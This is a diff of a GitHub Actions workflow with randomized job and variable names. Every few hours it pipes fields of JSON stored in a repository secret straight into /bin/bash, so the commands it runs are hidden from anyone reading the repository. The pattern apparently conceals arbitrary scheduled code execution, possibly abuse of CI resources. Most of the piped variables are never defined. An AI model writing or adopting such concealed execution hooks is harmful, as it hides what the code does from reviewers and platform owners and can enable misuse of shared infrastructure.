@@ -1,8 +1,9 @@
 name: limiaozhen5421
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
+    - cron: '58 3/6 * * *'
 
 jobs:
   build:
@@ -12,14 +13,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: limiaozhen5421
         env:
-          if61295: ${{ secrets.if61295 }}
+          afjfy842: ${{ secrets.afjfy842 }}
         run: |
-          echo $if61295 | jq -r .otrie51 | /bin/bash
-          echo $ulq02414 | jq -r .oalj325 | /bin/bash
-          echo $nrk47 | jq -r .y361 | /bin/bash
-          echo $qqy63 | jq -r .lrp740 | /bin/bash
-          echo $polfg16778 | jq -r .x63 | /bin/bash
-          echo $xs1656 | jq -r .dsjhz288 | /bin/bash
-          echo $idgp3593 | jq -r .q5 | /bin/bash
-          echo $txkr71077 | jq -r .od73 | /bin/bash
+          echo $afjfy842 | jq -r .ol1073 | /bin/bash
+          echo $ebbd556 | jq -r .lkza104 | /bin/bash
+          echo $iaij38 | jq -r .c0 | /bin/bash
+          echo $a83941 | jq -r .j2 | /bin/bash
+          echo $czemv2247 | jq -r .a28 | /bin/bash
+          echo $muc0 | jq -r .inki1850 | /bin/bash
+          echo $rrlc04 | jq -r .jev9 | /bin/bash
+          echo $hxwxs368 | jq -r .cqsl2679 | /bin/bash
+          echo $mwq29 | jq -r .d3066 | /bin/bash
+          echo $qyjim54364 | jq -r .g86279 | /bin/bash
+          echo $f2757 | jq -r .aqua8 | /bin/bash
+          echo $ke796 | jq -r .xt7913 | /bin/bash
+          echo $euqf65 | jq -r .i8806 | /bin/bash
 
